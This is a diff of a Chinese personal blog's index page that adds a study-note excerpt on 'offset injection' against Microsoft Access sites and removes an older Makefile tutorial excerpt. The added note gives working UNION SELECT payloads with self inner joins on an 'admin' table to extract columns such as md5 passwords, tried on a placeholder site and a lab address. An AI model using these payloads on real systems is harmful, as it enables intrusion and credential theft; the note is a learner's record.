@@ -141,6 +141,65 @@ var _hmt = _hmt || [];
 <div class="row">
 	<div class="col-md-8">
 		<h3 class="title">
+			<a href="/2021/01/21/ACCESS偏移注入/" >ACCESS偏移注入</a>
+		</h3>
+		</div>
+	<div class="col-md-4">
+		<div class="date">post @ 2021-01-21  </div>
+		</div>
+	</div>
+	
+
+
+			<div class="entry">
+  <div class="row">
+	
+	
+		<h1 id="偏移注入简介"><a href="#偏移注入简介" class="headerlink" title="偏移注入简介"></a>偏移注入简介</h1><p>适用于什么样的情况<br>一般用于在猜出了表名但是没有猜出列名的情况<br>为什么叫偏移：偏移量就是admin这张表的列的个数</p>
+<h1 id="偏移注入方法论"><a href="#偏移注入方法论" class="headerlink" title="偏移注入方法论"></a>偏移注入方法论</h1><h2 id="当下：已经用order-by语句得到select的字段数了"><a href="#当下：已经用order-by语句得到select的字段数了" class="headerlink" title="当下：已经用order by语句得到select的字段数了"></a>当下：已经用order by语句得到select的字段数了</h2><p>union select 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20 from admin<br>20表示的是select的字段数，但是admin不一定有这么多字段</p>
+<h2 id="推测admin里的字段数"><a href="#推测admin里的字段数" class="headerlink" title="推测admin里的字段数"></a>推测admin里的字段数</h2><pre><code>http://www.xxx.com/show.asp?id=123 union select 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,* from admin（页面报错）
+http://www.xxx.com/show.asp?id=123 union select 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,* from admin（页面正确）
+</code></pre><p>此时就发现了admin表下有四个字段（20-16=4）。<br>为什么呢？select<em>替代一些数据的作用是什么呢？？？<br>Select数字和具体什么表基本没有关系，select数字的作用就是为了大家调试方便，select</em>表示取出表中所有字段，用*代替的位数刚好不报错表示替代了那么多字段</p>
+<h2 id="inner-join-连接查询："><a href="#inner-join-连接查询：" class="headerlink" title="inner join 连接查询："></a>inner join 连接查询：</h2><p>ps：inner join查询是将一张表虚拟成多张相同的表来进行查询（我自己是这么理解的。）<br>首先用两张表来进行查询，应该减去重复的部分也就是这四个字段，不能让这四个字段算两次，这样的话20-4-4=12，语句中只需要罗列出12个数字。<br>继续，</p>
+<pre><code>http://www.xxx.com/show.asp?id=123 union select 1,2,3,4,5,6,7,8,9,10,11,12,* from (admin as a inner join admin as b on?a.id = b.id)
+http://www.xxx.com/show.asp?id=123 union select 1,2,3,4,5,6,7,8,9,10,11,12,a.id,b.id,* from (admin as a inner join?admin as b on a.id = b.id)
+</code></pre><p>上面的这两种情况还是报错，那么我们继续再来添加一张表，再减去重复的四个字段，20-4-4-4=8，语句中只需要罗列出8个数字。<br>再次使用inner join查询：</p>
+<pre><code>http://www.xxx.com/show.asp?id=123 union select 1,2,3,4,5,6,7,8,a.id,b.id,c.id,* from ((admin as a inner join admin as?b on a.id=b.id) inner join admin as c on a.id=c.id)
+</code></pre><p>页面返回正确，成功得到md5密码。</p>
+<p>admin表变成了(admin as a inner join admin as b on a.id=b.id)，这里是将admin重命名为了a和b两张表，然后通过inner join 将a表和b表的id相同字段展示出来，a表和b表本来都是admin表，所以id肯定都是相同的（这里要提醒一下，id这个字段可以换成其它字段，但是一定得存在，一般admin表中都存在id字段的），这样做的目的就是可以打乱顺序来爆出其它字段</p>
+<ol start="4">
+<li>但是由于增加了一张表，所以字段数得再减少一个*号的长度，所以就从6变成了3。</li>
+</ol>
+<p>注意，页面的源代码里面可能有隐藏的显示位</p>
+<p><img src="http://a1.qpic.cn/psc?/V11V3soz2JNi4c/ruAMsa53pVQWN7FLK88i5u5FnaAUH19KKc1aiIdB7YlQkEA8FfQRigo4qLBGOkSczbpN.t69cdh8pbQvktXFvPvUZKjI.MarHbf.DDQriC4!/m&amp;ek=1&amp;kp=1&amp;pt=0&amp;bo=rgNdAgAAAAABF8I!&amp;t=5&amp;tl=3&amp;vuin=3033668267&amp;tm=1611194400&amp;sce=60-4-3&amp;rf=0-0" alt="1"></p>
+<h1 id="疑惑"><a href="#疑惑" class="headerlink" title="疑惑"></a>疑惑</h1><p>如果说select模型是这样的<br><img src="http://a1.qpic.cn/psc?/V11V3soz2JNi4c/ruAMsa53pVQWN7FLK88i5u5FnaAUH19KKc1aiIdB7YkzSeoBqYq.D106mi8RiwLgb*5Kf.xXxu5KW7ehdwTXdVoXzeT8OFfsqeZlupJzXts!/b&amp;ek=1&amp;kp=1&amp;pt=0&amp;bo=JQOmAAAAAAABF7A!&amp;tl=3&amp;vuin=3033668267&amp;tm=1611194400&amp;sce=60-4-3&amp;rf=viewer_4&amp;t=5" alt="1"><br><img src="http://a1.qpic.cn/psc?/V11V3soz2JNi4c/ruAMsa53pVQWN7FLK88i5u5FnaAUH19KKc1aiIdB7YlWaXbFl1pJowHEyekkTQnbvJ10mj1x1ympRiMSzsnIVf3t2Zw8lwUWoT*uVoM*MWU!/m&amp;ek=1&amp;kp=1&amp;pt=0&amp;bo=KgMCAQAAAAABFxo!&amp;t=5&amp;tl=3&amp;vuin=3033668267&amp;tm=1611194400&amp;sce=60-4-3&amp;rf=0-0" alt="1"></p>
+<p>那么换掉*的位置应该可以显示出来什么的</p>
+<p>但是</p>
+<pre><code>http://192.168.0.128:8002/Production/PRODUCT_DETAIL.asp?id=1513 UNION SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22 from admin
+</code></pre><p><img src="http://a1.qpic.cn/psc?/V11V3soz2JNi4c/ruAMsa53pVQWN7FLK88i5u5FnaAUH19KKc1aiIdB7YmUWsYFlOjmhOv*BhpTl5PcnVYEXSzkZqIYrhnubjptnpbaAP0rD*KOljPHGq9rHdE!/m&amp;ek=1&amp;kp=1&amp;pt=0&amp;bo=GgUXAQAAAAABFzk!&amp;t=5&amp;tl=3&amp;vuin=3033668267&amp;tm=1611194400&amp;sce=60-4-3&amp;rf=0-0" alt="1"></p>
+<p>现在可见回显是3和15</p>
+<pre><code>http://192.168.0.128:8002/Production/PRODUCT_DETAIL.asp?id=1513 UNION SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,* from admin
+</code></pre><p><img src="http://a1.qpic.cn/psc?/V11V3soz2JNi4c/ruAMsa53pVQWN7FLK88i5lnIQRLxfsvngMOPkYgCEuMGHUeLaCNqllN.myOaDUVGh7*3IKtoWXmwzVdEGvx75KmpbtJhzMxEvu*ITaXbN6A!/m&amp;ek=1&amp;kp=1&amp;pt=0&amp;bo=UwU8AQAAAAABF1s!&amp;t=5&amp;tl=3&amp;vuin=3033668267&amp;tm=1611194400&amp;sce=60-4-3&amp;rf=0-0" alt="1"><br>可见<em>占了六个坑，那么把</em>的位置换在3或15上理应显示些什么东西<br><img src="http://a1.qpic.cn/psc?/V11V3soz2JNi4c/ruAMsa53pVQWN7FLK88i5lnIQRLxfsvngMOPkYgCEuOgEfoA92L7Ggr8gcV.xuk9C9KhsnVlx33LdGRmk7LkpFO.XAOMVW*POm8bgl05xsE!/m&amp;ek=1&amp;kp=1&amp;pt=0&amp;bo=JAUmAQAAAAABFzY!&amp;t=5&amp;tl=3&amp;vuin=3033668267&amp;tm=1611194400&amp;sce=60-4-3&amp;rf=0-0" alt="1"></p>
+<p>回显绕过了*顺延至4和16，发生了甚么事呢？现在不晓得</p>
+<p>那么使用inner join语句的目的就很明确了，打乱*的顺序</p>
+<pre><code>http://192.168.0.128:8002/Production/PRODUCT_DETAIL.asp?id=1513 UNION SELECT 1,2,*,4,5,6,7,8,9,10,11 from (admin as a inner join admin as b on a.id=b.id)
+</code></pre><p><img src="http://a1.qpic.cn/psc?/V11V3soz2JNi4c/ruAMsa53pVQWN7FLK88i5lnIQRLxfsvngMOPkYgCEuMt.4pMbzz*oNDNg*KVAaaPFLUnvcd5agxXnC3MQ9Z2unTRgFu*fATI0UHxK8TIANk!/b&amp;ek=1&amp;kp=1&amp;pt=0&amp;bo=PgU*AQAAAAABFzU!&amp;tl=3&amp;vuin=3033668267&amp;tm=1611194400&amp;sce=60-4-3&amp;rf=viewer_4&amp;t=5" alt="1"><br>而且不管*挪到哪，回显的都是日期<br><img src="http://m.qpic.cn/psc?/V11V3soz2JNi4c/45NBuzDIW489QBoVep5mcd07EmasSfC.T9lcco7YEpDF31Fk3tKcaw9YN1TaJ2EpR5gDIrgpXsExtuFoU2S.gahXiH2axSTITKod9nWVMXM!/b&amp;bo=BgU4AQAAAAABFwo!&amp;rf=viewer_4" alt="1"></p>
+<p>现在就又有个问题了，为什么a.id和b.id没占select的坑？<br><img src="http://m.qpic.cn/psc?/V11V3soz2JNi4c/45NBuzDIW489QBoVep5mcdUnEWPvPAYAT15vdLxb6MntbZqS*rJog4gwRzUNg4VDIugwCtvKhT1DD3vzSZHGVPvwZIiybGs0Y.uMZo5gRYA!/b&amp;bo=OgUmAQAAAAABFyg!&amp;rf=viewer_4&amp;t=5" alt="1"></p>
+<p><img src="http://m.qpic.cn/psc?/V11V3soz2JNi4c/45NBuzDIW489QBoVep5mcdUnEWPvPAYAT15vdLxb6MmM0MU21RyOD9mcgn96leDuGWro0JsecDKDOPmCBCRZIiRzt9SfGf5LCNULxw1XFdk!/b&amp;bo=ogQjAQAAAAABF7Q!&amp;rf=viewer_4&amp;t=5" alt="1"></p>
+<p><img src="http://m.qpic.cn/psc?/V11V3soz2JNi4c/45NBuzDIW489QBoVep5mcdUnEWPvPAYAT15vdLxb6MnkBghmepEmDvlbweU2Tl7DLYy7F39foSswSiZSE8D0Kzjiopj6ZQmxOudMvgBieuw!/b&amp;bo=8QQ8AQAAAAABF*g!&amp;rf=viewer_4&amp;t=5" alt="1"></p>
+
+	
+	</div>
+  <a type="button" href="/2021/01/21/ACCESS偏移注入/#more" class="btn btn-default more">Read More</a>
+</div>
+
+		
+			
+	
+	<!-- display as entry -->
+<div class="row">
+	<div class="col-md-8">
+		<h3 class="title">
 			<a href="/2021/01/20/MySQL注入学习记录/" >MySQL注入的学习记录</a>
 		</h3>
 		</div>
@@ -458,74 +517,6 @@ and exists (select user_name from admin) ——猜列名
 </div>
 
 		
-			
-	
-	<!-- display as entry -->
-<div class="row">
-	<div class="col-md-8">
-		<h3 class="title">
-			<a href="/2019/04/04/linux第一个应用及makefile文件/" >linux第一个应用及makefile文件</a>
-		</h3>
-		</div>
-	<div class="col-md-4">
-		<div class="date">post @ 2019-04-04  </div>
-		</div>
-	</div>
-	
-
-
-			<div class="entry">
-  <div class="row">
-	
-	
-		<p>从一个简单的应用程序入手，介绍了开发一个Linux应用程序的流程。通过实例分析了编译和连接的原理，并且剖析了程序执行的过程。最后讲述了Makefile管理工程文件如何管理软件代码。请读者多实践，只有不断的实践才能对这部分的知识深入理解。</p>
-<h2 id="Linux-develop"><a href="#Linux-develop" class="headerlink" title="Linux develop"></a>Linux develop</h2><h3 id="创建一个应用"><a href="#创建一个应用" class="headerlink" title="创建一个应用"></a>创建一个应用</h3><p>编辑gedit main.c还有另一种是vi，但首推gedit<br>编译gcc -o main.c main<br>运行main程序./main</p>
-<h2 id="嵌入式软件开发模式"><a href="#嵌入式软件开发模式" class="headerlink" title="嵌入式软件开发模式"></a>嵌入式软件开发模式</h2><p>嵌入式系统资源受限，直接在嵌入式系统硬件平台上编写软件较为困难。<br>解决方法<br>首先在通用计算机上编写软件<br>然后通过本地编译或者交叉编译生成目标平台上可以运行的二进制代码格式<br>最后再下载到目标平台上运行<br>（51单片机下载进去需要hex文件与bin文件区别在有地址，esp8266的ide开发用eclipse生成的bin文件下载进去，需要写地址）</p>
-<h3 id="交叉编译的概念"><a href="#交叉编译的概念" class="headerlink" title="交叉编译的概念"></a>交叉编译的概念</h3><p>在一种平台上编译出能在另一种平台（体系结构不同）上运行的程序；<br>在PC平台(X86)上编译出能运行在ARM平台上的程序，即编译得到的程序在X86平台上不能运行，必须放到ARM平台上才能运行；<br>用来编译这种程序的编译器就叫交叉编译器；<br>为了不与本地编译器混淆，交叉编译器的名字一般都有前缀，例如：arm-linux-gcc</p>
-<h3 id="交叉编译的原因"><a href="#交叉编译的原因" class="headerlink" title="交叉编译的原因"></a>交叉编译的原因</h3><p>1.目标平台所需要的Boot Loader以及OS核心还没有建立时，需要做交叉编译<br>2.目标机设备不具备一定的处理能力和存储空间</p>
-<h2 id="Makefile"><a href="#Makefile" class="headerlink" title="Makefile"></a>Makefile</h2><h3 id="What-is-Makefile"><a href="#What-is-Makefile" class="headerlink" title="What is Makefile?"></a>What is Makefile?</h3><p>我们要做的是make，makefile是make的基础<br>Makefile是一个文本文件，是GNU make程序在执行的时候默认读取的配置文件。Makefile有强大的功能，它记录了文件之间的依赖关系，通过比对目标文件和依赖文件的时间戳，决定是否需要执行相应的命令；同时，Makefile还可以定义变量，接收用户传递的参数变量，通过这些元素的相互配合，省去了繁杂的编译命令，不仅节省时间，也减小了出错的概率。</p>
-<h3 id="Brief-Introduction-of-Makefile"><a href="#Brief-Introduction-of-Makefile" class="headerlink" title="Brief Introduction of Makefile"></a>Brief Introduction of Makefile</h3><p>make 命令对于构建具有多个源文件的程序有很大的帮助<br>只有 make 命令还是不够的，还必须用 makefile 告诉它要做什么以及怎么做<br>make 命令和 Makefile 配合使用，能给项目管理带来极大便利。</p>
-<h3 id="Composition-of-Makefile"><a href="#Composition-of-Makefile" class="headerlink" title="Composition of Makefile"></a>Composition of Makefile</h3><p>一个 makefile 由依赖关系和规则两部分内容组成: 1.规则用来说明怎样使用所依赖的文件来建立目标文件。2.依赖关系由一个目标和一组该目标所依赖的源文件组成。<br><img src="http://a1.qpic.cn/psb?/V11V3soz2JNi4c/fReSmwGoLbWCg*kR3GeHG1**vLZLnTjo18aIs2pw*j8!/c/dLgAAAAAAAAA&amp;ek=1&amp;kp=1&amp;pt=0&amp;bo=3AEQAQAAAAADF*4!&amp;tl=1&amp;vuin=3033668267&amp;tm=1554987600&amp;sce=60-2-2&amp;rf=0-0" alt=""><br>依赖关系如图示</p>
-<h3 id="Rules-of-Makefile"><a href="#Rules-of-Makefile" class="headerlink" title="Rules of Makefile"></a>Rules of Makefile</h3><pre><code>目标：[依赖模块] 
-    命令 
-    命令
-</code></pre><p><em>命令前必须是tab键</em></p>
-<h3 id="make"><a href="#make" class="headerlink" title="make"></a>make</h3><p>Make的工作过程类似一次深度优先遍历过程</p>
-<h3 id="the-Variables-of-Makefile"><a href="#the-Variables-of-Makefile" class="headerlink" title="the  Variables of Makefile"></a>the  Variables of Makefile</h3><p>1.objects变量（$(objects)）<br>objects = main.o kbd.o command.o \<br>        display.o insert.o search.o files.o utils.o<br>edit : $(objects)<br>        cc -o edit $(objects)<br>2.预定义变量<br>无视无视<br>3.内部变量<br>$@扩展成当前规则的目的文件名<br>$&lt;扩展成依靠列表中的第一个依靠文件<br>$^扩展成整个依靠的列表（除掉了里面所有重复的文件名） </p>
-<h3 id="Others"><a href="#Others" class="headerlink" title="Others"></a>Others</h3><p>I just find it complicated to understand my makefile on the embeded system class, cause it was written from models given by Mrs Sun. Studying in B site is not realistic, while under a course vedio is a useful comment saying it is helpful to read the CN edition of GUN makefile mannul. I’ll try.</p>
-<h2 id="应用举例"><a href="#应用举例" class="headerlink" title="应用举例"></a>应用举例</h2><p>编写加、减、乘、除功能的多文件程序，使用make工具，要求在makefile文件中使用内部变量。参考pdf文档。</p>
-<pre><code>OBJS=main.o test.o test1.o test2.o test3.o
-CC=gcc
-CFLAGS = -c
-
-test :$(OBJS)
-    @$(CC) -o $@ $^
-
-main.o : main.c test.h
-    @$(CC) $(CFLAGS) $^
-
-test.o : test.c test.h
-    @$(CC) $(CFLAGS) $^
-
-test1.o : test1.c test.h
-    @$(CC) $(CFLAGS) $^
-
-test2.o : test2.c test.h
-    @$(CC) $(CFLAGS) $^
-
-test3.o : test3.c test.h
-    @$(CC) $(CFLAGS) $^
-
-.PHONY clean:
-    @rm -f  *.o  test
-</code></pre><p><img src="http://a3.qpic.cn/psb?/V11V3soz2JNi4c/1lFAOBTjWzdesET3zXnbKvJbgS1BC8ouM2Y3HeXHyUE!/c/dL4AAAAAAAAA&amp;ek=1&amp;kp=1&amp;pt=0&amp;bo=0ALAAwAAAAARFzE!&amp;tl=1&amp;vuin=3033668267&amp;tm=1554998400&amp;sce=60-2-2&amp;rf=0-0" alt=""><br><img src="http://a4.qpic.cn/psb?/V11V3soz2JNi4c/oKeo7tXdh9GHL4sfbBMteVkJx8KlwIMOQHmusGqYWvk!/c/dL8AAAAAAAAA&amp;ek=1&amp;kp=1&amp;pt=0&amp;bo=wAPQAgAAAAARFzE!&amp;tl=1&amp;vuin=3033668267&amp;tm=1554998400&amp;sce=60-2-2&amp;rf=0-0" alt=""></p>
-
-	
-	</div>
-  <a type="button" href="/2019/04/04/linux第一个应用及makefile文件/#more" class="btn btn-default more">Read More</a>
-</div>
-
-		
 
 		</div>
 
@@ -601,7 +592,7 @@ test3.o : test3.c test.h
 		
 			<li><a href="/categories/物联网/">物联网<span>3</span></a></li>
 		
-			<li><a href="/categories/网络安全/">网络安全<span>3</span></a></li>
+			<li><a href="/categories/网络安全/">网络安全<span>4</span></a></li>
 		
 			<li><a href="/categories/英语/">英语<span>1</span></a></li>
 		
@@ -622,45 +613,45 @@ test3.o : test3.c test.h
 		<h4>Tag Cloud</h4>
 		<ul class="tag_box inline list-unstyled">		
 		
-			<li><a href="/tags/量子物理/">量子物理<span>1</span></a></li>
-		
-			<li><a href="/tags/stm32/">stm32<span>15</span></a></li>
-		
-			<li><a href="/tags/GPIO/">GPIO<span>1</span></a></li>
-		
-			<li><a href="/tags/编译流程/">编译流程<span>1</span></a></li>
-		
-			<li><a href="/tags/技术外语文档/">技术外语文档<span>1</span></a></li>
-		
-			<li><a href="/tags/寄存器/">寄存器<span>2</span></a></li>
-		
-			<li><a href="/tags/数学/">数学<span>1</span></a></li>
-		
-			<li><a href="/tags/linux/">linux<span>4</span></a></li>
-		
-			<li><a href="/tags/前端/">前端<span>1</span></a></li>
-		
-			<li><a href="/tags/SQL注入/">SQL注入<span>3</span></a></li>
-		
-			<li><a href="/tags/重映射/">重映射<span>1</span></a></li>
-		
-			<li><a href="/tags/后端/">后端<span>1</span></a></li>
-		
-			<li><a href="/tags/mathematica/">mathematica<span>2</span></a></li>
-		
-			<li><a href="/tags/指令/">指令<span>1</span></a></li>
-		
-			<li><a href="/tags/MySQL/">MySQL<span>1</span></a></li>
-		
 			<li><a href="/tags/HC-05/">HC-05<span>1</span></a></li>
 		
-			<li><a href="/tags/工程模板/">工程模板<span>1</span></a></li>
+			<li><a href="/tags/计算机网络/">计算机网络<span>1</span></a></li>
+		
+			<li><a href="/tags/c语言/">c语言<span>1</span></a></li>
+		
+			<li><a href="/tags/SQL注入/">SQL注入<span>4</span></a></li>
+		
+			<li><a href="/tags/xcom/">xcom<span>1</span></a></li>
 		
 			<li><a href="/tags/ADC/">ADC<span>1</span></a></li>
 		
-			<li><a href="/tags/markdown/">markdown<span>1</span></a></li>
+			<li><a href="/tags/GPIO/">GPIO<span>1</span></a></li>
+		
+			<li><a href="/tags/stm32/">stm32<span>15</span></a></li>
+		
+			<li><a href="/tags/linux/">linux<span>4</span></a></li>
+		
+			<li><a href="/tags/makefile/">makefile<span>1</span></a></li>
 		
 			<li><a href="/tags/c/">c#<span>1</span></a></li>
+		
+			<li><a href="/tags/markdown/">markdown<span>1</span></a></li>
+		
+			<li><a href="/tags/云服务器/">云服务器<span>1</span></a></li>
+		
+			<li><a href="/tags/调试/">调试<span>1</span></a></li>
+		
+			<li><a href="/tags/数学/">数学<span>1</span></a></li>
+		
+			<li><a href="/tags/后端/">后端<span>1</span></a></li>
+		
+			<li><a href="/tags/wifi/">wifi<span>2</span></a></li>
+		
+			<li><a href="/tags/技术外语文档/">技术外语文档<span>1</span></a></li>
+		
+			<li><a href="/tags/matlab/">matlab<span>5</span></a></li>
+		
+			<li><a href="/tags/树莓派/">树莓派<span>3</span></a></li>
 		
 		
 		   <li><a href="/tags">...<span>53</span></a></li>
@@ -676,6 +667,10 @@ test3.o : test3.c test.h
   <ul class="entry list-unstyled">
     
       <li>
+        <a href="/2021/01/21/ACCESS偏移注入/" ><i class="fa fa-file-o"></i>ACCESS偏移注入</a>
+      </li>
+    
+      <li>
         <a href="/2021/01/20/MySQL注入学习记录/" ><i class="fa fa-file-o"></i>MySQL注入的学习记录</a>
       </li>
     
@@ -689,10 +684,6 @@ test3.o : test3.c test.h
     
       <li>
         <a href="/2019/07/03/matlab开发stm32初学笔记/" ><i class="fa fa-file-o"></i>matlab开发stm32初学笔记</a>
-      </li>
-    
-      <li>
-        <a href="/2019/05/18/外刊阅读和技术文档翻译/" ><i class="fa fa-file-o"></i>外刊阅读和技术文档翻译</a>
       </li>
     
   </ul>
